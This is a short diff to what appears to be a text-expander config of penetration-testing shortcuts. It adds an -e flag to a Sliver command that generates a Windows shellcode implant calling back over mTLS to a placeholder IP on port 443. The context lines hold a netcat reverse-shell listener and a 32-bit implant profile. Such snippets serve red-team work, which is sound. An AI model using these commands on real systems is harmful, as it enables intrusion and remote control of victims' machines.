@@ -91,7 +91,7 @@ matches:
     replace: nc -nvlp 443
     
   - trigger: ":sliver64profile"
-    replace: profiles new --mtls {{IP}}:443 --format shellcode -o windows  win-shellcode
+    replace: profiles new -e --mtls {{IP}}:443 --format shellcode -o windows  win-shellcode
   
   - trigger: ":sliver32profile"
     replace: profiles new -a 386 --mtls {{IP}}:443 --format shellcode -o windows win-shellcodex86
